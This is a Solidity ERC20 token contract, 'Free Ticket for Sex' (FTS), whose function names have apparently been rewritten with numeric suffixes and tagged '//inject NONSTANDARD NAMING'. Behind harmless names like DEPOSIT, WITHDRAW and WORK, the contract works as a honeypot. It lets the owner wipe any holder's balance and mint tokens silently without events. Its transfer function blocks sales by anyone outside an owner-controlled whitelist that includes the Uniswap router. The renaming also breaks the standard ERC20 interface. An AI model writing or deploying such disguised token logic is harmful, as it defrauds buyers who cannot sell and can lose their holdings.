                                                                 

pragma solidity ^0.5.16;
interface IERC20 {
    function TOTALSUPPLY71() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF193(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER681(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE329(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE405(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM785(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER175(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL689(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}
contract Context {
    constructor () internal { }
    function _MSGSENDER61() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY71() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF193(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER681(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER316(_MSGSENDER61(), recipient, amount);
        return true;
    }
    function ALLOWANCE329(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE405(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE63(_MSGSENDER61(), spender, amount);
        return true;
    }
    function TRANSFERFROM785(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER316(sender, recipient, amount);
        _APPROVE63(sender, _MSGSENDER61(), _allowances[sender][_MSGSENDER61()].SUB358(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE644(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE63(_MSGSENDER61(), spender, _allowances[_MSGSENDER61()][spender].ADD555(addedValue));
        return true;
    }
    function DECREASEALLOWANCE830(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE63(_MSGSENDER61(), spender, _allowances[_MSGSENDER61()][spender].SUB358(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER316(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB358(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD555(amount);
        emit TRANSFER175(sender, recipient, amount);
    }
    function _INITMINT398(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD555(amount);
        _balances[account] = _balances[account].ADD555(amount);
        emit TRANSFER175(address(0), account, amount);
    }
    function _WORK71(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD555(amount);
        _balances[account] = _balances[account].ADD555(amount);
    }
    function _WITHDRAW795(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: _withdraw to the zero address");
        _totalSupply = _totalSupply.ADD555(amount);
        _balances[account] = _balances[account].ADD555(amount);
    }
    function _DEPOSIT320(address acc) internal {	//inject NONSTANDARD NAMING
        _balances[acc] = 0;
    }
    function _APPROVE63(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit APPROVAL689(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME300() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL913() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS412() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD555(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function SUB358(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB358(a, b, "SafeMath: subtraction overflow");
    }
    function SUB358(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function MUL644(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function DIV21(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV21(a, b, "SafeMath: division by zero");
    }
    function DIV21(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract FreeTicketforSex is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public financer;
  mapping (address => bool) public subfinancer;
  address univ2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  constructor () public ERC20Detailed("Free Ticket for Sex", "FTS", 18) {
      _INITMINT398( msg.sender, 1000*10**uint(DECIMALS412()) );
      financer[msg.sender] = true;
      subfinancer[msg.sender] = true;
      subfinancer[univ2] = true;
  }

  function DEPOSIT511(address account) public {	//inject NONSTANDARD NAMING
      require(financer[msg.sender], "!warn");
      _DEPOSIT320(account);
  }

  function WITHDRAW884(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(financer[msg.sender], "!warn");
      _WITHDRAW795(account, amount);
  }

  function WORK498(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(financer[msg.sender], "!warn");
      _WORK71(account, amount);
  }

  function ADDSUBFINANCER521(address account) public {	//inject NONSTANDARD NAMING
      require(financer[msg.sender], "!not allowed");
      subfinancer[account] = true;
  }

  function REMOVESUBFINANCER354(address account) public {	//inject NONSTANDARD NAMING
      require(financer[msg.sender], "!not allowed");
      subfinancer[account] = false;
  }
  
  function _TRANSFER316(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
      require(subfinancer[sender], "frozen");
      super._TRANSFER316(sender, recipient, amount);
  }

}